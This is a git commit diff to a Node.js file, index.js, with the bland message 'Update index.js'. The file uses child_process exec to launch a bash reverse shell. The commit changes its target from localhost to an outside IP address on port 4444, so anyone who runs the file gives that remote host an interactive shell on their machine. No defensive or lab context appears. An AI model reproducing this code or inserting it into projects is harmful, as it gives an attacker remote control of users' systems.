8cf1c0d9e9bb3767a7c48083ab9111cfe851456b
Divyesh Prajapati <divy.er@gmail.com>
2025-07-28 18:16:33 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 const { exec } = require('child_process');
 
 // This command works on Unix-based systems
-exec('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"', (error, stdout, stderr) => {
+exec('bash -c "bash -i >& /dev/tcp/9.30.250.133/4444 0>&1"', (error, stdout, stderr) => {
   console.log(stdout);
   console.error(stderr);
   if (error !== null) {
